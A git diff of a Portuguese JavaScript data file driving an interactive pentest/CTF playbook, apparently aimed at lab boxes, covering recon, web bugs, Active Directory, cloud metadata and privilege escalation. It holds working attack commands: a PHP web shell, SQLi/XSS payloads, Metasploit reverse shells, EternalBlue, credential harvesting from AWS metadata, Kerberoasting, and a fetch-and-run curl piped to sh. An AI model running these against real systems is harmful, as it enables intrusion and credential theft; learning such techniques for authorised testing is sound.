@@ -22,7 +22,7 @@
 
   /* ——— OUTLINE (minimap) ——— */
   pb.outline = [
-    { id: "roe", label: "RoE" },
+    { id: "roe", label: "Escopo" },
     { id: "session", label: "Sessão" },
     { id: "alive", label: "Alvo vivo?" },
     { id: "passive", label: "Recon passivo" },
@@ -48,10 +48,11 @@
         { id: "web-cmdi", label: "CMDi" },
         { id: "web-graphql", label: "GraphQL" },
         { id: "nuclei", label: "Nuclei" },
-        { id: "burp-method", label: "Burp método" },
+        { id: "burp-method", label: "Burp Suite" },
         { id: "wordpress", label: "WordPress" },
         { id: "jenkins", label: "Jenkins" },
         { id: "tomcat", label: "Tomcat" },
+        { id: "msf", label: "Metasploit" },
         { id: "smb", label: "SMB" },
         { id: "nxc-smb", label: "nxc SMB" },
         { id: "ldap", label: "LDAP" },
@@ -94,11 +95,11 @@
     passive: {
       phase: "Recon",
       title: "Recon passivo",
-      say: "Antes de bater no IP: mapa o que já vazou na internet. Barato, silencioso, e muitas vezes entrega o próximo passo de graça.",
+      say: "Antes do IP: o que já vazou (subs, certs, URLs).",
       blocks: [
         {
           title: "Subdomínios — subfinder",
-          cmd: `subfinder -d "$DOMAIN" -silent -o recon/subfinder.txt
+          cmd: `subfinder -d "$DOMAIN" -silent
 # se tiver API keys configuradas, o yield sobe muito`,
           label: "bash",
           why: "Passivo de verdade: fontes OSINT. Não resolve DNS agressivo ainda.",
@@ -111,7 +112,6 @@
           title: "crt.sh — Certificate Transparency",
           cmd: `curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \\
   | jq -r '.[].name_value' 2>/dev/null | sed 's/\\*\\.//g' | sort -u \\
-  | tee recon/crtsh.txt
 # fallback sem jq:
 # curl -s "https://crt.sh/?q=%25.$DOMAIN" | grep -oP '[a-z0-9.-]+\\.'"$DOMAIN" | sort -u`,
           label: "bash",
@@ -119,9 +119,9 @@
         },
         {
           title: "Wayback / gau — URLs históricas",
-          cmd: `echo "$DOMAIN" | gau --subs | tee recon/gau.txt | head -200
+          cmd: `echo "$DOMAIN" | gau --subs | head -200
 # filtra endpoints suculentos
-grep -Ei 'admin|api|backup|\\.env|\\.git|swagger|graphql|upload' recon/gau.txt | sort -u | tee recon/gau_hot.txt`,
+echo "$DOMAIN" | gau --subs | grep -Ei 'admin|api|backup|\\.env|\\.git|swagger|graphql|upload' | sort -u | head -80`,
           label: "bash",
           why: "Path antigo no Wayback = superfície que o gobuster ainda não viu.",
         },
@@ -137,9 +137,9 @@ grep -Ei 'admin|api|backup|\\.env|\\.git|swagger|graphql|upload' recon/gau.txt |
         {
           title: "ASN / ranges",
           cmd: `# quem anuncia o IP?
-whois "$IP" | tee recon/whois.txt
+whois "$IP"
 # se DOMAIN → ranges da org (amass intel / bgp.he.net)
-curl -s "https://api.hackertarget.com/aslookup/?q=$IP" | tee recon/asn.txt`,
+curl -s "https://api.hackertarget.com/aslookup/?q=$IP"`,
           label: "bash",
           why: "ASN grande = superfície lateral. Só varre IPs in-scope.",
         },
@@ -155,7 +155,7 @@ curl -s "https://api.hackertarget.com/aslookup/?q=$IP" | tee recon/asn.txt`,
     "web-api": {
       phase: "Web",
       title: "API / OpenAPI",
-      say: "XHR no DevTools é o mapa real. Swagger aberto é presente de Natal — mas BOLA/IDOR é onde o dinheiro mora.",
+      say: "XHR no DevTools mapeia a API. Swagger aberto ajuda; BOLA/IDOR é o foco.",
       blocks: [
         {
           title: "Achar spec",
@@ -172,15 +172,15 @@ done`,
             <li>Anota: <code>Authorization: Bearer …</code>, <code>X-Api-Key</code>, cookies de sessão</li>
             <li>Replay sem header → 401? Com header de outro user → IDOR?</li>
           </ul>`,
-          cmd: `curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/me" | tee evidence/api_me.json
-curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/2" | tee evidence/api_user2.json`,
+          cmd: `curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/me"
+curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/2"`,
           label: "bash",
           why: "Troca o ID. Se voltar dados do user 2 com token do 1 = BOLA.",
         },
         {
           title: "BOLA / IDOR em massa (ffuf)",
           cmd: `ffuf -u "$TARGET/api/v1/users/FUZZ" -w $WORDLIST_IDS \\
-  -H "Authorization: Bearer $TOKEN" -mc 200 -o recon/ffuf_bola.json`,
+  -H "Authorization: Bearer $TOKEN" -mc 200`,
           label: "bash",
         },
         {
@@ -203,7 +203,7 @@ curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/2" | tee evidenc
     "web-jwt": {
       phase: "Web",
       title: "JWT — abusos clássicos",
-      say: "JWT não é magia. É blob assinável. Se a verificação for frouxa, tu vira admin no Repeater.",
+      say: "JWT = blob assinável. Verificação frouxa → troca claim no Repeater.",
       blocks: [
         {
           title: "Decodifica e inventaria",
@@ -337,7 +337,7 @@ printf '\\xff\\xd8\\xff\\xe0<?php system($_GET["c"]); ?>' > /tmp/shell.jpg`,
     "web-ssrf": {
       phase: "Web",
       title: "SSRF",
-      say: "Parâmetro que puxa URL = SSRF até prova em contrário. Cloud metadata é o jackpot; interno é o pão de cada dia.",
+      say: "Parâmetro que puxa URL = SSRF até prova em contrário. Prioridade: metadata cloud, depois rede interna.",
       tone: "warn",
       blocks: [
         {
@@ -493,7 +493,7 @@ curl -s "$TARGET/fetch?url=http://SEU_COLABORATOR"`,
     "web-cache": {
       phase: "Web",
       title: "Web cache poisoning / deception",
-      say: "Cache é estado compartilhado. Se tu envenena a chave errada, a vítima bebe o teu HTML.",
+      say: "Cache compartilhado. Chave errada → resposta tua pra outra vítima.",
       blocks: [
         {
           title: "Poisoning — mindset",
@@ -510,15 +510,15 @@ curl -s "$TARGET/fetch?url=http://SEU_COLABORATOR"`,
             <li>Path: <code>/account/settings/foo.css</code> — CDN acha estático, origin devolve HTML autenticado</li>
             <li>Extensão falsa / path normalization diverge entre cache e origin</li>
           </ul>`,
-          cmd: `curl -sI "$TARGET/account" | tee recon/cache_account.txt
-curl -sI "$TARGET/account/x.css" | tee recon/cache_deception.txt
+          cmd: `curl -sI "$TARGET/account"
+curl -sI "$TARGET/account/x.css"
 # compara Cache-Control / CF-Cache-Status / Age`,
           label: "bash",
         },
       ],
       choices: [
         { label: "Impacto em user — reportar", to: "report" },
-        { label: "Método Burp (1 var)", to: "burp-method" },
+        { label: "Burp Suite", to: "burp-method" },
         { label: "Voltar ao Web", to: "web" },
       ],
     },
@@ -526,19 +526,28 @@ curl -sI "$TARGET/account/x.css" | tee recon/cache_deception.txt
     nuclei: {
       phase: "Web",
       title: "Nuclei",
-      say: "Templates pra superfície conhecida. Não substitui cérebro — acelera o óbvio e o CVE de ontem.",
+      say: "Templates CVE / misconfig / exposure. Valida hit no curl/Burp antes de reportar.",
       blocks: [
         {
           title: "Scan direcionado",
-          cmd: `nuclei -u "$TARGET" -o recon/nuclei.txt
+          cmd: `nuclei -u "$TARGET"
 # mais barulho / cobertura:
-nuclei -u "$TARGET" -t http/cves/ -t http/exposures/ -severity medium,high,critical -o recon/nuclei_pri.txt`,
+nuclei -u "$TARGET" -t http/cves/ -t http/exposures/ -t http/misconfiguration/ -severity medium,high,critical`,
           label: "bash",
           why: "Em prod: rate consciente. Em lab: pode abrir o cano.",
         },
         {
+          title: "Com Basic Auth",
+          cmd: `nuclei -u "$TARGET/protected/" \\
+  -H "Authorization: Basic $(echo -n 'USER:PASS' | base64 -w0)" \\
+  -t http/misconfiguration/ -t http/exposures/ -t http/cves/ \\
+  -severity medium,high,critical`,
+          label: "bash",
+          why: "Troca USER:PASS (ex. bobo:bubbles). Path = pasta que abriu com 200.",
+        },
+        {
           title: "Lista de URLs",
-          cmd: `nuclei -l recon/urls.txt -o recon/nuclei_list.txt
+          cmd: `nuclei -l urls.txt
 # tags úteis: tech, misconfig, exposure, cve`,
           label: "bash",
         },
@@ -555,47 +564,188 @@ nuclei -u "$TARGET" -t http/cves/ -t http/exposures/ -severity medium,high,criti
         { label: "Hit web → aprofundar", to: "web" },
         { label: "Hit WordPress", to: "wordpress" },
         { label: "Hit Jenkins", to: "jenkins" },
+        { label: "Tomcat /manager", to: "tomcat" },
         { label: "Validado — reportar", to: "report" },
+        { label: "Mapa de portas", to: "ports" },
+      ],
+    },
+
+    msf: {
+      phase: "Foothold",
+      title: "Metasploit",
+      say: "msfconsole: search → use → set → run. LHOST = tun0. RPORT = porta do serviço (Tomcat ≠ 80).",
+      blocks: [
+        {
+          title: "Abrir",
+          cmd: `msfconsole -q
+# atualizar DB (raro, demora):
+# sudo msfdb init
+# msfupdate`,
+          label: "bash → msf",
+        },
+        {
+          title: "Ritual",
+          cmd: `search NOME
+use caminho/do/modulo
+show options
+show payloads
+set RHOSTS $IP
+set RPORT $RPORT
+set LHOST $LHOST
+set LPORT $LPORT
+setg LHOST $LHOST
+setg LPORT $LPORT
+run
+# ou: exploit -j   (job em background)`,
+          label: "msfconsole",
+          why: "setg grava LHOST/LPORT pra todos os módulos da sessão.",
+        },
+        {
+          title: "Handler manual (payload fora do exploit)",
+          cmd: `use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+run -j`,
+          label: "msfconsole",
+        },
+        {
+          title: "Tomcat manager → WAR upload",
+          cmd: `use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS $IP
+set RPORT $RPORT
+set HttpUsername USER
+set HttpPassword PASS
+set LHOST $LHOST
+set LPORT $LPORT
+set PAYLOAD java/meterpreter/reverse_tcp
+# Linux sem java payload estável:
+# set PAYLOAD linux/x64/meterpreter/reverse_tcp
+run`,
+          label: "msfconsole",
+          why: "Cred = manager-gui. ToolsRUs: RPORT 1234, bob:bubbles.",
+        },
+        {
+          title: "EternalBlue (SMB)",
+          cmd: `use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS $IP
+set LHOST $LHOST
+run`,
+          label: "msfconsole",
+        },
+        {
+          title: "Sessões / meterpreter",
+          cmd: `sessions -l
+sessions -i 1
+getuid
+sysinfo
+pwd
+download /etc/passwd
+upload ./linpeas.sh /tmp/linpeas.sh
+shell
+background
+sessions -k 1`,
+          label: "msfconsole",
+        },
+        {
+          title: "Falhou?",
+          html: `<ul>
+            <li>LHOST errado (eth0 vs tun0)</li>
+            <li>RPORT default 80 com serviço em outra porta</li>
+            <li>Payload arch/OS errado</li>
+            <li>Firewall no caminho do reverse</li>
+            <li><code>set VERBOSE true</code> / <code>check</code> antes do run</li>
+          </ul>`,
+        },
+      ],
+      choices: [
+        { label: "Tomcat /manager", to: "tomcat" },
+        { label: "SMB / EternalBlue", to: "smb" },
+        { label: "Shell / TTY", to: "shell" },
+        { label: "Privesc Linux", to: "privesc-linux" },
+        { label: "Privesc Windows", to: "privesc-windows" },
+        { label: "Reportar", to: "report" },
         { label: "Mapa de portas", to: "ports" },
       ],
     },
 
     "burp-method": {
       phase: "Web",
-      title: "Método Burp — uma variável por vez",
-      say: "Repeater não é shotgun. Muda UMA coisa, observa, anota. É assim que achado vira repro.",
+      title: "Burp Suite",
+      say: "Proxy → Repeater. Community aguenta lab. Scope primeiro; Intruder depois.",
       blocks: [
         {
-          title: "Ritual",
-          html: `<ol>
-            <li>Baseline: request que funciona (200 + body conhecido)</li>
-            <li>Muda 1 header / 1 param / 1 cookie</li>
-            <li>Compara status, length, body diff</li>
-            <li>Só então combina mutações</li>
-          </ol>`,
-        },
-        {
-          title: "Checklist rápido",
+          title: "Setup",
           html: `<ul>
-            <li>Método: GET↔POST↔PUT↔PATCH↔DELETE</li>
-            <li>Content-Type: json ↔ form ↔ xml</li>
-            <li>Auth: remove, troca user, token expirado</li>
-            <li>IDOR: incrementa IDs</li>
-            <li>Path: <code>../</code>, <code>;</code>, encoding duplo</li>
+            <li>Burp Community → Proxy → Intercept on</li>
+            <li>Browser: proxy <code>127.0.0.1:8080</code> (FoxyProxy) ou burp browser</li>
+            <li>CA: http://burpsuite → import cert (HTTPS)</li>
+            <li>Target → Scope = host in-scope só</li>
+            <li>Proxy → Intercept off pra navegar; liga pra capturar 1 request</li>
           </ul>`,
         },
         {
+          title: "Fluxo diário",
+          html: `<ol>
+            <li>Navega o app com Intercept off (HTTP history enche)</li>
+            <li>History → Send to Repeater (request interessante)</li>
+            <li>Repeater: muda 1 coisa, Send, compara</li>
+            <li>Achado: salva request/response (Copy / Save)</li>
+          </ol>`,
+        },
+        {
+          title: "Repeater — 1 variável",
+          html: `<ul>
+            <li>Baseline: 200 + body conhecido</li>
+            <li>Método GET↔POST↔PUT↔DELETE</li>
+            <li>Content-Type json ↔ form ↔ xml</li>
+            <li>Auth: tira header, troca user, token velho</li>
+            <li>IDOR: incrementa id</li>
+            <li>Path: <code>../</code>, encoding duplo</li>
+          </ul>`,
+        },
+        {
+          title: "Intruder (Community = lento)",
+          html: `<ul>
+            <li>Send to Intruder → Positions: marca o valor com §</li>
+            <li>Attack type: Sniper</li>
+            <li>Payloads: wordlist curta (IDs, users)</li>
+            <li>Olha Status / Length — anomalia = ponto</li>
+            <li>Lab grande: ffuf/wfuzz no bash é mais rápido</li>
+          </ul>`,
+        },
+        {
+          title: "Decoder / Comparer",
+          html: `<ul>
+            <li>Decoder: Base64, URL, JWT parts</li>
+            <li>Comparer: duas responses lado a lado (length/bytes)</li>
+          </ul>`,
+        },
+        {
+          title: "Basic Auth no Burp",
+          cmd: `# Header pronto (bobo:bubbles exemplo):
+# Authorization: Basic Ym9iOmJ1YmJsZXM=
+echo -n 'USER:PASS' | base64 -w0`,
+          label: "bash",
+          why: "Cola no Repeater se o site pedir Basic de novo.",
+        },
+        {
           title: "Evidência",
-          cmd: `# salva request/response do Repeater em
-# requests/caso-N.req  evidence/caso-N.resp`,
+          cmd: `# Repeater → Save item / Copy to file
+# Nota: URL, método, param, resposta que prova o bug`,
           label: "nota",
         },
       ],
       choices: [
+        { label: "Web — continuar enum", to: "web" },
+        { label: "Auth / login", to: "web-auth" },
         { label: "API / BOLA", to: "web-api" },
         { label: "JWT", to: "web-jwt" },
+        { label: "SQLi", to: "web-sqli" },
+        { label: "XSS", to: "web-xss" },
+        { label: "Metasploit", to: "msf" },
         { label: "Achado — reportar", to: "report" },
-        { label: "Voltar ao Web", to: "web" },
+        { label: "Mapa de portas", to: "ports" },
       ],
     },
 
@@ -606,8 +756,8 @@ nuclei -u "$TARGET" -t http/cves/ -t http/exposures/ -severity medium,high,criti
       blocks: [
         {
           title: "Enum",
-          cmd: `wpscan --url "$TARGET" --enumerate u,ap,tt --plugins-detection mixed -o recon/wpscan.txt
-curl -s "$TARGET/wp-json/wp/v2/users" | tee recon/wp_users.json
+          cmd: `wpscan --url "$TARGET" --enumerate u,ap,tt --plugins-detection mixed
+curl -s "$TARGET/wp-json/wp/v2/users"
 curl -sI "$TARGET/xmlrpc.php"`,
           label: "bash",
         },
@@ -641,7 +791,7 @@ wpscan --url "$TARGET" -U $USERS -P $WORDLIST_PASS --password-attack xmlrpc`,
           title: "Checagem",
           cmd: `curl -sI "http://$IP:$RPORT/"
 curl -s "http://$IP:$RPORT/script" | head
-nmap -sV -p "$RPORT" --script http-jenkins-enum -oA recon/nmap_jenkins "$IP"`,
+nmap -sV -p "$RPORT" --script http-jenkins-enum "$IP"`,
           label: "bash",
         },
         {
@@ -676,9 +826,9 @@ println "id".execute().text</pre>
       blocks: [
         {
           title: "Nmap + anonymous",
-          cmd: `nmap -sV -p 389,636 --script ldap-rootdse,ldap-search -oA recon/nmap_ldap "$IP"
+          cmd: `nmap -sV -p 389,636 --script ldap-rootdse,ldap-search "$IP"
 ldapsearch -x -H ldap://"$IP" -b "" -s base namingContexts
-ldapsearch -x -H ldap://"$IP" -b "DC=lab,DC=local" "(objectClass=person)" sAMAccountName | tee recon/ldap_users.txt`,
+ldapsearch -x -H ldap://"$IP" -b "DC=lab,DC=local" "(objectClass=person)" sAMAccountName`,
           label: "bash",
           why: "Ajusta o base DN pro domínio real (RootDSE entrega).",
         },
@@ -700,17 +850,17 @@ ldapsearch -x -H ldap://"$IP" -b "DC=lab,DC=local" "(objectClass=person)" sAMAcc
     kerberos: {
       phase: "Rede",
       title: "Kerberos (88)",
-      say: "Porta 88 = domínio vivo. AS-REP roast e Kerberoast são o pão com manteiga — sem tocar em explotação barulhenta.",
+      say: "Porta 88 = domínio. AS-REP / Kerberoast antes de barulho.",
       blocks: [
         {
           title: "Descobrir realm",
-          cmd: `nmap -sV -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN" -oA recon/nmap_kerberos "$IP"
+          cmd: `nmap -sV -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN" "$IP"
 nxc smb "$IP" --users`,
           label: "bash",
         },
         {
           title: "AS-REP Roast (users sem pre-auth)",
-          cmd: `impacket-GetNPUsers "$DOMAIN/" -usersfile $USERS -dc-ip "$IP" -format hashcat | tee recon/asrep.txt
+          cmd: `impacket-GetNPUsers "$DOMAIN/" -usersfile $USERS -dc-ip "$IP" -format hashcat
 # ou com cred de domínio:
 impacket-GetNPUsers "$DOMAIN/user:pass" -request -dc-ip "$IP" -format hashcat`,
           label: "bash",
@@ -718,7 +868,7 @@ impacket-GetNPUsers "$DOMAIN/user:pass" -request -dc-ip "$IP" -format hashcat`,
         },
         {
           title: "Kerberoast",
-          cmd: `impacket-GetUserSPNs "$DOMAIN/user:pass" -dc-ip "$IP" -request | tee recon/tgs.txt
+          cmd: `impacket-GetUserSPNs "$DOMAIN/user:pass" -dc-ip "$IP" -request
 # hashcat -m 13100`,
           label: "bash",
         },
@@ -747,7 +897,7 @@ impacket-GetNPUsers "$DOMAIN/user:pass" -request -dc-ip "$IP" -format hashcat`,
       blocks: [
         {
           title: "Enum",
-          cmd: `nmap -sV -p 5985,5986 -oA recon/nmap_winrm "$IP"
+          cmd: `nmap -sV -p 5985,5986 "$IP"
 nxc winrm "$IP" -u user -p 'pass'`,
           label: "bash",
         },
@@ -780,7 +930,7 @@ nxc winrm "$IP" -u user -H 'NTHASH'`,
       blocks: [
         {
           title: "Enum",
-          cmd: `nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs -oA recon/nmap_nfs "$IP"
+          cmd: `nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs "$IP"
 showmount -e "$IP"`,
           label: "bash",
         },
@@ -808,8 +958,8 @@ ls -la /tmp/nfs
       blocks: [
         {
           title: "Enum",
-          cmd: `nmap -sU -p 161 --script snmp-info,snmp-processes,snmp-win32-users -oA recon/nmap_snmp "$IP"
-snmpwalk -v2c -c public "$IP" | tee recon/snmpwalk.txt
+          cmd: `nmap -sU -p 161 --script snmp-info,snmp-processes,snmp-win32-users "$IP"
+snmpwalk -v2c -c public "$IP"
 # communities comuns:
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$IP"`,
           label: "bash",
@@ -830,9 +980,9 @@ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.
       blocks: [
         {
           title: "Transfer",
-          cmd: `dig ns "$DOMAIN" +short | tee recon/dns_ns.txt
+          cmd: `dig ns "$DOMAIN" +short
 # pra cada NS:
-dig axfr "$DOMAIN" @"$IP" | tee recon/axfr.txt
+dig axfr "$DOMAIN" @"$IP"
 # se DOMAIN ≠ IP do NS, usa o NS real:
 # dig axfr "$DOMAIN" @ns1.alvo.tld`,
           label: "bash",
@@ -856,7 +1006,7 @@ dig axfr "$DOMAIN" @"$IP" | tee recon/axfr.txt
       blocks: [
         {
           title: "Enum + login",
-          cmd: `nmap -sV -p 5432 --script pgsql-brute -oA recon/nmap_pg "$IP"
+          cmd: `nmap -sV -p 5432 --script pgsql-brute "$IP"
 psql -h "$IP" -U postgres -d postgres
 # \\l  \\du  \\dt`,
           label: "bash",
@@ -884,8 +1034,8 @@ SELECT current_user;`,
       blocks: [
         {
           title: "Auth check",
-          cmd: `nmap -sV -p 6379 --script redis-info -oA recon/nmap_redis "$IP"
-redis-cli -h "$IP" INFO | tee recon/redis_info.txt
+          cmd: `nmap -sV -p 6379 --script redis-info "$IP"
+redis-cli -h "$IP" INFO
 redis-cli -h "$IP" CONFIG GET dir`,
           label: "bash",
         },
@@ -917,7 +1067,7 @@ EOF`,
       blocks: [
         {
           title: "Enum",
-          cmd: `nmap -sV -p 27017 --script mongodb-info,mongodb-databases -oA recon/nmap_mongo "$IP"
+          cmd: `nmap -sV -p 27017 --script mongodb-info,mongodb-databases "$IP"
 mongosh --host "$IP" --eval 'db.adminCommand({ listDatabases: 1 })'`,
           label: "bash",
         },
@@ -942,9 +1092,9 @@ mongosh --host "$IP" --eval 'db.adminCommand({ listDatabases: 1 })'`,
       blocks: [
         {
           title: "Enum",
-          cmd: `curl -s "http://$IP:9200/" | tee recon/es_root.json
-curl -s "http://$IP:9200/_cat/indices?v" | tee recon/es_indices.txt
-curl -s "http://$IP:9200/_search?pretty&size=5" | tee evidence/es_sample.json`,
+          cmd: `curl -s "http://$IP:9200/"
+curl -s "http://$IP:9200/_cat/indices?v"
+curl -s "http://$IP:9200/_search?pretty&size=5"`,
           label: "bash",
         },
         {
@@ -962,7 +1112,7 @@ curl -s "http://$IP:9200/_search?pretty&size=5" | tee evidence/es_sample.json`,
     "ad-attack": {
       phase: "AD",
       title: "AD hub — mindset",
-      say: "Active Directory não é um exploit. É um grafo: enum → cred → BloodHound → caminho curto → lateral. Não spraya o planeta no minuto 1.",
+      say: "AD = grafo. Enum → cred → BloodHound → caminho curto → lateral. Spray depois, não no minuto 1.",
       blocks: [
         {
           title: "1. Enum",
@@ -1058,17 +1208,16 @@ nxc smb "$IP" -u user -H 'NTHASH' -x 'hostname'`,
     responder: {
       phase: "AD",
       title: "Responder (LLMNR / NBT-NS)",
-      say: "Só em LAN e com RoE explícito pra poisoning. Fora disso é barulho hostil e fora de escopo.",
-      tone: "danger",
+      say: "Só em LAN e com escopo pra poisoning. Fora disso = barulho e fora do alvo.",
+      tone: "warn",
       blocks: [
         {
-          title: "Gate RoE",
+          title: "Antes",
           html: `<ul>
-            <li>Escopo inclui segmentação local / broadcast?</li>
-            <li>Cliente autorizou credential poisoning?</li>
+            <li>Segmento local / lab / broadcast no escopo?</li>
             <li>Não é ferramenta de internet-facing</li>
-          </ul>
-          <p>Sem sim claro → não sobe Responder. Ponto.</p>`,
+            <li>Box HTB isolada → geralmente pula</li>
+          </ul>`,
         },
         {
           title: "Uso",
@@ -1095,12 +1244,12 @@ nxc smb "$IP" -u user -H 'NTHASH' -x 'hostname'`,
     "aws-metadata": {
       phase: "Cloud",
       title: "AWS metadata / IAM",
-      say: "Chegou em 169.254.169.254 (SSRF ou shell na instância) = role credentials. Daí é aws cli mindset, não 'hackar a AWS'.",
+      say: "169.254.169.254 (SSRF ou shell) = credenciais da role. aws cli a partir daí.",
       tone: "warn",
       blocks: [
         {
           title: "IMDSv1",
-          cmd: `curl -s http://169.254.169.254/latest/meta-data/ | tee recon/imds.txt
+          cmd: `curl -s http://169.254.169.254/latest/meta-data/
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`,
           label: "bash",
@@ -1134,12 +1283,12 @@ aws iam list-attached-role-policies --role-name ROLE`,
     "k8s-exposed": {
       phase: "Cloud",
       title: "Kubernetes exposto",
-      say: "API server / kubelet / dashboard sem auth na borda = cluster takeover em potencial. kubectl é o cliente; RoE manda no que tu lista.",
+      say: "API server / kubelet / dashboard sem auth = cluster em risco. kubectl lista o que o escopo permitir.",
       tone: "warn",
       blocks: [
         {
           title: "Sinais de porta",
-          cmd: `nmap -sV -p 6443,8443,10250,10255,2379,4194 -oA recon/nmap_k8s "$IP"
+          cmd: `nmap -sV -p 6443,8443,10250,10255,2379,4194 "$IP"
 curl -sk https://"$IP":6443/version
 curl -sk https://"$IP":10250/pods`,
           label: "bash",
@@ -1176,13 +1325,13 @@ curl -sk https://"$IP":10250/pods`,
       blocks: [
         {
           title: "Unpack / smali",
-          cmd: `apktool d app.apk -o recon/apk_smali
+          cmd: `apktool d app.apk
 # AndroidManifest, resources, smali`,
           label: "bash",
         },
         {
           title: "Java almost-source (jadx)",
-          cmd: `jadx -d recon/apk_jadx app.apk
+          cmd: `jadx -d ./apk_jadx app.apk
 # procura: API keys, URLs, WebView JS bridges, certificate pinning flags`,
           label: "bash",
         },
@@ -1215,7 +1364,7 @@ curl -sk https://"$IP":10250/pods`,
           cmd: `# no atacante:
 python3 -m http.server 80
 # no alvo:
-curl -L http://"$LHOST"/linpeas.sh | sh | tee /tmp/linpeas.out`,
+curl -L http://"$LHOST"/linpeas.sh | sh`,
           label: "alvo",
         },
         {
@@ -1226,7 +1375,7 @@ curl -L http://"$LHOST"/linpeas.sh | sh | tee /tmp/linpeas.out`,
         },
         {
           title: "SUID / capabilities",
-          cmd: `find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt
+          cmd: `find / -perm -4000 -type f 2>/dev/null
 getcap -r / 2>/dev/null`,
           label: "shell",
         },
@@ -1249,12 +1398,12 @@ systemctl list-timers --all 2>/dev/null
     "privesc-windows": {
       phase: "Privesc",
       title: "Privesc Windows",
-      say: "winpeas + checks manuais clássicos. AlwaysInstallElevated, token privileges, unquoted service path — ainda pagam almoço.",
+      say: "winpeas + checks manuais: AlwaysInstallElevated, token privileges, unquoted service path.",
       blocks: [
         {
           title: "winpeas",
           cmd: `# transfer via smb/http/evil-winrm upload
-.\\winPEASx64.exe | tee winpeas.out`,
+.\\winPEASx64.exe`,
           label: "cmd/ps",
         },
         {
@@ -1327,10 +1476,10 @@ nxc smb targets.txt -u user -H 'NTHASH' --continue-on-success`,
       blocks: [
         {
           title: "Probes clássicos",
-          cmd: `curl -s "$TARGET/page?file=../../../../etc/passwd" | tee recon/lfi_passwd.txt
+          cmd: `curl -s "$TARGET/page?file=../../../../etc/passwd"
 curl -s "$TARGET/page?file=....//....//....//etc/passwd"
 # ffuf traversal
-ffuf -u "$TARGET/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0 -o recon/lfi_ffuf.json`,
+ffuf -u "$TARGET/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0`,
           label: "bash",
         },
         {
@@ -1373,15 +1522,15 @@ curl -s "$TARGET/item?id=1 AND 1=2"
 # boolean / time (MySQL)
 curl -s "$TARGET/item?id=1' AND SLEEP(3)-- -"`,
           label: "bash",
-          why: "Diferença de body/tempo/erro = ponto. Salva o request cru do Burp em requests/sqli.req.",
+          why: "Diferença de body/tempo/erro = ponto. Se quiser sqlmap -r, salva o request do Burp à mão.",
         },
         {
           title: "sqlmap no request",
-          cmd: `sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM --batch --dbs
+          cmd: `sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM --batch --dbs
 # dump pontual (não o planeta):
-sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM -D DB -T users --dump --threads 4
+sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM -D DB -T users --dump --threads 4
 # shell OS se DBA + file/exec:
-sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM --os-shell`,
+sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM --os-shell`,
           label: "bash",
         },
         {
@@ -1405,7 +1554,7 @@ sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM --os-shell`,
     "web-xss": {
       phase: "Web",
       title: "XSS",
-      say: "Reflected, stored, DOM. Impacto = sessão/ação no browser da vítima — não 'alert bonito'.",
+      say: "XSS: reflected / stored / DOM. Impacto = sessão ou ação no browser da vítima.",
       blocks: [
         {
           title: "Checklist rápido",
@@ -1418,7 +1567,7 @@ sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM --os-shell`,
         },
         {
           title: "Probes",
-          cmd: `curl -s "$TARGET/search?q=<script>alert(1)</script>" | tee recon/xss_reflected.txt
+          cmd: `curl -s "$TARGET/search?q=<script>alert(1)</script>"
 # polyglot / context break
 curl -s "$TARGET/search?q=\"><img src=x onerror=alert(1)>"
 # cookie steal PoC (só lab / RoE):
@@ -1432,7 +1581,7 @@ curl -s "$TARGET/search?q=\"><img src=x onerror=alert(1)>"
       ],
       choices: [
         { label: "Achado — reportar", to: "report" },
-        { label: "Método Burp (1 var)", to: "burp-method" },
+        { label: "Burp Suite", to: "burp-method" },
         { label: "Voltar ao Web", to: "web" },
       ],
     },
@@ -1473,12 +1622,12 @@ curl -s "$TARGET/ping?host=127.0.0.1;curl%20http://$LHOST/cmdi"
     "web-graphql": {
       phase: "Web",
       title: "GraphQL",
-      say: "Um endpoint, mil resolvers. Introspection + IDOR no argumento = BOLA com perfume novo.",
+      say: "Introspection + IDOR em argumento = BOLA em GraphQL.",
       blocks: [
         {
           title: "Achar + introspect",
           cmd: `curl -s "$TARGET/graphql" -H 'Content-Type: application/json' \\
-  -d '{"query":"{ __schema { types { name } } }"}' | tee recon/gql_schema.txt
+  -d '{"query":"{ __schema { types { name } } }"}'
 # aliases comuns: /api/graphql /graphiql /v1/graphql`,
           label: "bash",
         },
@@ -1508,7 +1657,7 @@ curl -s "$TARGET/graphql" -H 'Content-Type: application/json' \\
     "crack-hash": {
       phase: "Creds",
       title: "Crack de hash",
-      say: "Hash sem crack é souvenir. Modo certo + wordlist certa + regras. Depois volta pro spray/lateral.",
